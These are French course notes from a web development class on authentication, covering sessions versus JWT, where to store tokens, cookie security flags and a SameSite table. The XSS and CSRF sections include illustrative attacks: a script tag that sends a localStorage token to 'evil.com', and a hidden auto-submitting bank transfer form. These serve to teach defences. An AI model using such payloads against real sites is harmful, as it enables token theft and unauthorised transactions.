# SC03E01 - Authentification


## Présentation saison

En 2 parties : 

- 2 jours de cours classiques
  - E01 - Authentification
  - E02 - Autorisation

- 2 Jours d'atelier PP
  - E03 - briefing et démarrage atelier
  - E04 fin atelier - correction en cours
  

## Auth

- login
- mdp
- token
- hash
- sécurité
- cookies
- csrf
- xss
- sanitize

## Approches d'authentification

[fiche stratégies d'authentification](./ressources/auth_strategies.md)

## Stateful vs Stateless

**Stateful : Session**

1. User s'authentifie (login)
2. Le serveur stocke les infos utiles dans une *session* qu'on stocke dans un *store* (mémoire serveur, db, cache Redis...)
3. Le serveur retourne *l'identifiant de session* au client via un cookie
4. A chaque requête le client fournit *l'identifiant de session* au serveur (= requête authentifiée)
5. Le serveur peut retrouver les informations du user *authentifié* depuis la *session*
6. Le user se déconnecte (logout) -> la *session* est supprimée + *l'identifiant de session* est supprimé du cookie

Analogie : 
On loue un casier à la gare, on va nous attribuer une casier (`session`) et on nous donne un ticket avec le numéro du casier (`sessionId`).
Lorsqu'on souhaite récupérer nos affaires, on ne va pas piocher directement dans le casier, on fournit le ticket (``sessionId``) et la personne en charge des casiers (`serveur`) va aller récupérer nos affaires dans le bon casier.


**Stateless : JWT**

1. User s'authentifie (login)
2. Le serveur encode les informations utiles dans un *token JWT signé*
3. Le serveur retourne *le JWT* au client via un cookie
4. A chaque requête le client fournit *le JWT* au serveur (= requête authentifiée)
5. Le serveur vérifie que le token est valide ia la *signature*, puis retrouve les informations en *décodant*  le token
6. Le user se déconnecte (logout) -> *le JWT* est supprimé du cookie

[fiche JWT](./ressources/JWT.md)

Analogie : 
C'est un passeport. Les informations sont stockées sur le passeport (``jwt``) et la personne en charge de vérifier les identités à la douane (`serveur`) devra s'assurer que le passeport est un vrai (`signature`) et lire les infos (`décodage`).


## Stockage des tokens ?

Tokens au sens large : 
    - sessionId
    - JWT
    - autre...

Stockage côté frontend -> c'est le front qui doit envoyer le token au serveur.

- **localstorage**
  - vulnérable aux attaques XSS -> le JS navigateur peut le lire
- **sessionstorage**
  - même vulnérabilité que localstorage

- **mémoire** front -> state, variable...-> exposé aux failles XSS également, pas de persistance


- **cookies**
  - Avantages:
    - défini par le serveur (`Set-cookie`)
    - expiration paramétrable
    - stockés et renvoyés automatiquement
    - options de sécurité :
      - `HttpOnly` -> cookie inaccessible via le JS
      - `sameSite` -> protège des attaques CSRF -> on préfèrera passer sameSite en 'strict'
      - `Secure` -> n'envoie les cookies que en HTTPS (pour le dev à désactiver)
  - Inconvénients:
    - vulnérable aux attaques CSRF si mal paramétré

### Failles de sécurité

**XSS** (Cross Site Scripting)

Exécuter du JS malveillant dans le navigateur victime, injecté depuis une source externe (attaquant).

- Attaquant : `BOB`
- Victime : `ALICE`
- Formulaire profil avec champ `firstname` mal échappé (pas de sanitize).
- BOB saisit : `<script>fetch('https://evil.com/steal', {method:'POST', body: localStorage.getItem('access_token')});</script>`
- Si l'appli fait `element.innerHTML = firstname`, le script s'exécute et exfiltre le token.

```js
element.innerHTML = userInput; // ❌ dangereux (exécute du HTML/JS injecté)
element.textContent = userInput; // ✅ sûr pour afficher du texte
```

**CSRF** (Cross Site Request Forgery)

Exploitation de la confiance d'un site envers le navigateur de l'utilisateur

- Attaquant : `BOB`
- Victime : `ALICE`
- Alice est connectée à `bank.com` (cookie encore valide).
- BOB héberge `evil.com` qui force un POST caché vers `bank.com/transfer`.
- Le navigateur joint automatiquement le cookie de session.
- Sans protection (`SameSite=Lax|Strict`, token anti-CSRF, double-submit cookie...), l'action est traitée.
  → Résultat : virement à l'insu d'Alice.

```html
<!-- evil.com présente un formulaire automatisé invisible -->

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="BOB_COMPTE" />
  <input type="hidden" name="amount" value="1000" />
</form>

<script>
  document.forms[0].submit();
</script>
```

## Sécurité Cookies

### Same-site

[Lien MDN](https://developer.mozilla.org/fr/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value)

| Situation                                  | Strict | Lax | None |
| ------------------------------------------ | ------ | --- | ---- |
| **app.com → app.com** (same-site GET)      | ✅      | ✅   | ✅    |
| **app.com → app.com** (same-site POST)     | ✅      | ✅   | ✅    |
| **app.com → api.app.com** (sous-domaine)   | ✅      | ✅   | ✅    |
| **Clic lien** vers app.com (GET top-level) | ❌      | ✅   | ✅    |
| other.com **Formulaire POST** -> app.com   | ❌      | ❌   | ✅    |
| other.com **fetch/AJAX POST** -> app.com   | ❌      | ❌   | ✅    |
| other.com **`<img>`/iframe** -> app.com    | ❌      | ❌   | ✅    |

